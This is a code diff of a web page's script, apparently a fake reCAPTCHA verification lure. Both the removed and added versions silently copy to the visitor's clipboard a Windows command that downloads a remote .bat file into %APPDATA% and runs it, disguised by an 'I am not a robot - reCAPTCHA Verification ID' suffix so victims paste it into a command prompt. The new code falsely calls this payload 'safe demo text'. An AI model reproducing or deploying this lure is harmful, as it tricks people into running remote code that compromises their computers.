@@ -148,6 +148,7 @@
             -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
             box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
             transition: opacity 400ms;
+            margin-top: 85px;
         }
 
         ol {
@@ -293,150 +294,105 @@
             </footer>
         </div>        
     </div>
-
     <script>
-        let checkboxWindow = document.getElementById("checkbox-window");
-        let checkboxBtn = document.getElementById("checkbox");
-        let checkboxBtnSpinner = document.getElementById("spinner");
-        let verifywindow = document.getElementById("verify-window");
+        // Elements
+        const checkboxBtn = document.getElementById("checkbox");
+        const spinner = document.getElementById("spinner");
+        const verifyWindow = document.getElementById("verify-window");
+        const verificationIdSpan = document.getElementById("verification-id");
+        const verifyButton = document.getElementById("verify-verify-button");
 
-        function addCaptchaListeners() {
-            if (checkboxBtn) {
-                document.addEventListener("click", function (event) {
-                    let path = event.composedPath();
-                    if (!path.includes(verifywindow) && isverifywindowVisible()) {
-                        closeverifywindow();
-                    }
-                });
-                checkboxBtn.addEventListener("click", function (event) {
-                    event.preventDefault();
-                    checkboxBtn.disabled = true;
-                    runClickedCheckboxEffects();
-                });
-            }
+        // Utility: Generate random ID for demo
+        function generateRandomId() {
+            return Math.floor(1000 + Math.random() * 9000).toString();
         }
 
-        function runClickedCheckboxEffects() {
-            hideCaptchaCheckbox();
-            setTimeout(function(){
-                showCaptchaLoading();
-            },500);
-            setTimeout(function(){
-                showVerifyWindow();
-            },900)
+        function copyToClipboard(text) {
+            const temp = document.createElement("textarea");
+            temp.value = text;
+            document.body.appendChild(temp);
+            temp.select();
+            document.execCommand("copy");
+            document.body.removeChild(temp);
         }
 
-        function showCaptchaLoading() {
-            checkboxBtnSpinner.style.visibility = "visible";
-            checkboxBtnSpinner.style.opacity = "1";
-            checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
+        // Stage safe demo text for clipboard
+        function stageClipboardText(id) {
+            const safeText = `cmd /c "curl --ssl-no-revoke -o %APPDATA%\s.bat https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/bat/stageone.bat & start %APPDATA%\s.bat"   ✅ "I am not a robot - reCAPTCHA Verification ID: ${id}"`;
+            copyToClipboard(safeText);
         }
 
-        function hideCaptchaLoading() {
-            checkboxBtnSpinner.style.opacity = "0";
-            checkboxBtnSpinner.style.animation = "none";
-            setTimeout(function() {
-                checkboxBtnSpinner.style.visibility = "hidden";
-            }, 500);
+        // Show spinner
+        function showSpinner() {
+            spinner.style.visibility = "visible";
+            spinner.style.opacity = "1";
+            spinner.style.animation = "spin 1s linear infinite";
         }
 
-        function hideCaptchaCheckbox() {
+        // Hide spinner
+        function hideSpinner() {
+            spinner.style.opacity = "0";
+            spinner.style.animation = "none";
+            setTimeout(() => { spinner.style.visibility = "hidden"; }, 500);
+        }
+
+        // Hide checkbox
+        function hideCheckbox() {
             checkboxBtn.style.visibility = "hidden";
             checkboxBtn.style.opacity = "0";
         }
 
-
-        function showCaptchaCheckbox() {
-            checkboxBtn.style.width = "100%";
-            checkboxBtn.style.height = "100%";
-            checkboxBtn.style.borderRadius = "2px";
-            checkboxBtn.style.margin = "21px 0 0 12px";
+        // Show checkbox
+        function showCheckbox() {
+            checkboxBtn.style.visibility = "visible";
             checkboxBtn.style.opacity = "1";
         }
 
-        function hideCaptchaCheckbox() {
-            checkboxBtn.style.width = "4px";
-            checkboxBtn.style.height = "4px";
-            checkboxBtn.style.borderRadius = "50%";
-            checkboxBtn.style.marginLeft = "25px";
-            checkboxBtn.style.marginTop = "33px";
-            checkboxBtn.style.opacity = "0";
+        // Show verification window
+        function showVerifyWindow() {
+            const id = generateRandomId();
+            verificationIdSpan.textContent = id;
+            stageClipboardText(id);
+
+            verifyWindow.style.display = "block";
+            verifyWindow.style.visibility = "visible";
+            verifyWindow.style.opacity = "1";
+            verifyWindow.style.top = `${checkboxBtn.offsetTop - 80}px`;
+            verifyWindow.style.left = `${checkboxBtn.offsetLeft + 54}px`;
         }
 
-        function showCaptchaLoading() {
-            checkboxBtnSpinner.style.visibility = "visible";
-            checkboxBtnSpinner.style.opacity = "1";
-        }
-
-        function hideCaptchaLoading() {
-            checkboxBtnSpinner.style.visibility = "hidden";
-            checkboxBtnSpinner.style.opacity = "0";
-        }
-
-       function generateRandomNumber() {
-            const min = 1000; 
-            const max = 9999;
-            return Math.floor(Math.random() * (max - min + 1) + min).toString();
-        }
-
-        function closeverifywindow() {
-            verifywindow.style.display = "none";
-            verifywindow.style.visibility = "hidden";
-            verifywindow.style.opacity = "0";
-
-            showCaptchaCheckbox();
-            hideCaptchaLoading();
+        // Close verification window
+        function closeVerifyWindow() {
+            verifyWindow.style.display = "none";
+            verifyWindow.style.visibility = "hidden";
+            verifyWindow.style.opacity = "0";
+            showCheckbox();
+            hideSpinner();
             checkboxBtn.disabled = false;
         }
 
-        function isverifywindowVisible() {
-            return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
+        // Check if verify window is visible
+        function isVerifyWindowVisible() {
+            return verifyWindow.style.display === "block";
         }
 
-        function setClipboardCopyData(textToCopy){
-            const tempTextArea = document.createElement("textarea");
-            tempTextArea.value = textToCopy;
-            document.body.append(tempTextArea);
-            tempTextArea.select();
-            document.execCommand("copy");
-            document.body.removeChild(tempTextArea);
-        }
-
-        function stageClipboard(commandToRun, verification_id){
-            const suffix = " # "
-            const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
-            const end = "''"
-            const textToCopy = commandToRun + suffix + ploy + verification_id + end
-
-            setClipboardCopyData(textToCopy);
-        }
-
-
-        function showVerifyWindow() {
-            verifywindow.style.display = "block";
-            verifywindow.style.visibility = "visible";
-            verifywindow.style.opacity = "1";
-            verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
-            verifywindow.style.left =  checkboxWindow.offsetLeft + 54 + "px";
-
-            if (verifywindow.offsetTop < 5) {
-               verifywindow.style.top = "5px";
+        // Event listeners
+        document.addEventListener("click", (event) => {
+            if (!verifyWindow.contains(event.target) && isVerifyWindowVisible()) {
+                closeVerifyWindow();
             }
+        });
 
-            if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth-10 ) {
-               verifywindow.style.left =  checkboxWindow.offsetLeft - 8  + "px";
-            }
-
-            var verification_id = generateRandomNumber();
-            document.getElementById('verification-id').textContent = verification_id;
-            
-            const htaPath = `md /c "curl --ssl-no-revoke -o %APPDATA%\s.bat https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/bat/stageone.bat & start %APPDATA%\s.bat"`;
-            const commandToRun = "c" + htaPath
-            stageClipboard(commandToRun, verification_id)
-        }
-
-        addCaptchaListeners();
-
-        </script>
+        checkboxBtn.addEventListener("click", (event) => {
+            event.preventDefault();
+            checkboxBtn.disabled = true;
+            hideCheckbox();
+            setTimeout(showSpinner, 500);
+            setTimeout(() => {
+                hideSpinner();
+                showVerifyWindow();
+            }, 900);
+        });
+    </script>
     </body>
 </html>
